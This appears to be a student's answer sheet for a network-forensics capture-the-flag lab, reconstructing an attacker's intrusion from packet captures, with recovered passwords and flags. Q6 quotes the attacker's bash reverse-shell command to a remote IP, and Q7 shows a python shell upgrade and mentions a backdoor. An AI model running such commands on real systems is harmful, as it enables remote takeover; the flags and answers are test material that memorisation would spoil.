# Q1

  - FTP
  - FTP-DATA
  - HTTP
  - ICMP
  - MySQL
  - TCP
  - TLSv1.3
---

# Q2

  ### The correct password is `batman`
  
  ![image](https://user-images.githubusercontent.com/118754984/220819918-f8df9b62-c9bc-49cf-9a6e-1aea98bf729a.png)
  ---
  
# Q3

  The attacker managed to get a file called credentials.txt and the bash history. (refer to the previous screenshot)
  The credentials.txt file had the credentials for the database:
  
    username: myuser
    password: P@ssw0rd123456!
    
# Q4
  
  He logged into the database using these credentials:
    
    username: myuser
    password: P@ssw0rd123456!
    
   
# Q5

  username: root
  password: 1amgr000000t!@#$
  
  
# Q6

  packet no. 2686
  
  command = `bash -c 'bash -i >& /dev/tcp/192.168.0.106/4444 0>&1'`
  
  
# Q7

  He spawned a stable python shell:
    
    python3 -c "import pty; pty.spawn('/bin/bash');"
    
  He also installed a backdoor (available in the lab manual repository)
  
# Q8

  He read gr00t.txt which had a flag
  `flag{1_4m_gr00000t!}`
  
# Q9
  
  To install a backdoor in the system which listens for a connection

# Q10
  
  I changed the backdoor python script to decode the commands that the attacker used:
  (The script I used is attached)
  
    id

    cat gr00t.txt

    echo "flag{c0ngrats_1f_y0u_m4d3_1t_t1ll_h3r3_ch4mp}" | whoami

  
  

  
  
  
  
